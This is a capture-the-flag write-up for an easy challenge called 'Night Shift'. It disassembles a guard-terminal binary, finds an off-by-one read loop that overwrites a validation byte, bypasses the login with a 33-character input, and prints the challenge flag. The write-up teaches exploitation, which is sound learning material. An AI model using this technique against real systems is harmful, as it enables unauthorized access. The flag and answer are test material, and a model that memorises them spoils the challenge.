---
title: "Night Shift"
difficulty: Easy
description: "You've been hired as a security consultant to test the new guard terminal at Nightfall Industries. The system authenticates night shift guards before granting access to classified documents. The developers swear the input validation is bulletproof. Can you prove them wrong?"
flag: "CSC{S1NGLE_ByTE_OfF_sH1fT_534L2_THE_DE4L}"
---

# Night shift

> *You've been hired as a security consultant to test the new guard terminal at Nightfall Industries. The system authenticates night shift guards before granting access to classified documents. The developers swear the input validation is bulletproof. Can you prove them wrong?*

binary asks for an access code, prints granted or denied. statically linked x86-64 ELF.

```
========================================
    Nightfall Industries - Guard Terminal
    Night Shift Access Control v2.1
========================================

Enter access code: test
ACCESS DENIED - Invalid credentials.
```


let's look at `main`:

```
000000000040188c <main>:
  40188c:	endbr64
  401890:	push   %rbp
  401891:	mov    %rsp,%rbp
  401894:	sub    $0xd0,%rsp
  ...
  401913:	lea    -0xc0(%rbp),%rax       # buffer at rbp-0xc0
  40191a:	mov    $0x21,%edx             # memset 0x21 = 33 bytes to zero
  40191f:	mov    $0x0,%esi
  401924:	mov    %rax,%rdi
  401927:	call   401110 <_init+0x110>   # memset(buf, 0, 33)
  ...
  40198b:	lea    -0xc0(%rbp),%rax       # same buffer
  401992:	mov    $0x20,%esi             # size = 0x20 = 32
  401997:	mov    %rax,%rdi
  40199a:	call   4017fe <read_line>     # read_line(buf, 32)
  40199f:	movzbl -0xa0(%rbp),%eax       # load byte at rbp-0xa0
  4019a6:	test   %al,%al               # is it zero?
  4019a8:	je     401a63 <main+0x1d7>   # if zero -> ACCESS DENIED
```

so the buffer starts at `rbp-0xc0`. it calls `read_line(buf, 0x20)` which reads up to 32 bytes. then it checks the byte at `rbp-0xa0`. that's offset `0xc0 - 0xa0 = 0x20 = 32` from the start of the buffer. the 33rd byte.

But the buffer was zeroed for 33 bytes (0x21), and `read_line` only takes 32 as the size. let's check if the loop condition is off by one:

```
$ objdump -d night_shift | grep -A 40 '<read_line>:'
00000000004017fe <read_line>:
  ...
  401820:	movl   $0x0,-0x14(%rbp)      # i = 0
  401827:	jmp    40186b
  401829:	lea    -0x15(%rbp),%rax       # &char_buf
  40182d:	mov    $0x1,%edx
  401832:	mov    %rax,%rsi
  401835:	mov    $0x0,%edi
  40183a:	call   450c50 <__libc_read>   # read(0, &c, 1)
  ...
  40184e:	cmp    $0xa,%al              # if c == '\n' break
  401850:	je     401873
  401852:	mov    -0x14(%rbp),%eax
  401855:	lea    0x1(%rax),%edx        # i++
  401858:	mov    %edx,-0x14(%rbp)
  40185b:	movslq %eax,%rdx
  40185e:	mov    -0x28(%rbp),%rax      # buf ptr
  401862:	add    %rax,%rdx
  401865:	movzbl -0x15(%rbp),%eax
  401869:	mov    %al,(%rdx)            # buf[i] = c (post-increment, so old i)
  40186b:	mov    -0x14(%rbp),%eax
  40186e:	cmp    -0x2c(%rbp),%eax      # i <= size (not i < size!)
  401871:	jle    401829                 # loop while i <= 0x20
```

there it is. `cmp` at `40186e` followed by `jle` at `401871`. that's `i <= size`, not `i < size`. so when size is 0x20 (32), it reads bytes at indices 0 through 32, which is 33 bytes total. the 33rd byte (index 32) lands at `buf + 0x20` which is exactly `rbp-0xa0`, the validation byte.

the buffer was zeroed for 33 bytes, so that byte starts as 0. if we only send 32 bytes, byte 33 stays 0 and the `test %al,%al` / `je` sends us to ACCESS DENIED. but if we send 33 bytes, byte 33 gets whatever we send and it's nonzero, so the jump is not taken and we hit ACCESS GRANTED.

```
========================================
    Nightfall Industries - Guard Terminal
    Night Shift Access Control v2.1
========================================

Enter access code: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ACCESS GRANTED but classified documents are unavailable.
```

that's 33 A's. "but classified documents are unavailable" is just because there's no real flag.txt locally. on the remote server:

```
========================================
    Nightfall Industries - Guard Terminal
    Night Shift Access Control v2.1
========================================

Enter access code: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ACCESS GRANTED - Welcome, authorized personnel.
Classified document: CSC{S1NGLE_ByTE_OfF_sH1fT_534L2_THE_DE4L}
```

`CSC{S1NGLE_ByTE_OfF_sH1fT_534L2_THE_DE4L}`
